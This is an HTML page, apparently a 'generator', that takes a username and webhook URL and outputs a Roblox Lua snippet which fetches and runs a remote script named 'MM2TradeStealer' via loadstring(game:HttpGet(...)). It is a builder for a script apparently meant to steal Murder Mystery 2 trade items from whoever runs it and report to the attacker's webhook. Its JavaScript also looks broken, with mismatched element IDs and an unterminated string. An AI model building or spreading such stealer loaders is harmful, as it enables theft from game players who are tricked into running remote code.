<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Eksova On Top</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
  <style>
    /* Global Styles */
    body {
      font-family: Arial, sans-serif;
      background-color: #000000; /* Dark purple background */
      text-align: center;
      padding: 50px;
    }

    /* Container Styles */
    .container {
      background-color: #ffffff; /* Darker purple background */
      padding: 20px;
      border-radius: 8px;
      display: inline-block;
    }

    /* Input Field Styles */
    .input-field {
      margin: 10px 0;
    }

    /* Button Styles */
    button {
      padding: 10px 20px;
      background-color: #000000; /* Purple button background */
      color: #ffffff; /* White button text */
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #000000; /* Darker purple button hover */
    }

    /* Output Styles */
    #output {
      text-align: left;
      white-space: pre-wrap;
    }

    /* Textarea Styles */
    textarea {
      width: 100%;
      height: 150px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Eksova Generator!</h1>
    <form>
      <label for="username">Username:</label>
      <input type="text" id="username" name="local userName"><br><br>
      <label for="webhook">Webhook URL:</label>
      <input type="text" id="webhook" name="local webHook"><br><br>
      <button type="button" onclick="generateOutput()">Generate</button>
      <textarea id="output"></textarea><br><br>
      <button type="button" onclick="copyToClipboard()">Copy to Clipboard</button>
    </form>
  </div>

  <script>
    function generateOutput() {
      const username = document.getElementById("local userName").value;
      const webhook = document.getElementById("local webHook").value;
      const outputString = `local userName = "${username}"\n` +
                           `local webHook = "${webhook}"\n` +
                           'loadstring(game:HttpGet("https://raw.githubusercontent.com/PsxScripty/Eks0va133/main/MM2TradeStealer", true))();
      document.getElementById("output").value = outputString;
      hljs.highlightAll();
    }

    function copyToClipboard() {
      const copyText = document.getElementById("output");
      copyText.select();
      document.execCommand("copy");
    }
  </script>
</body>
</html>
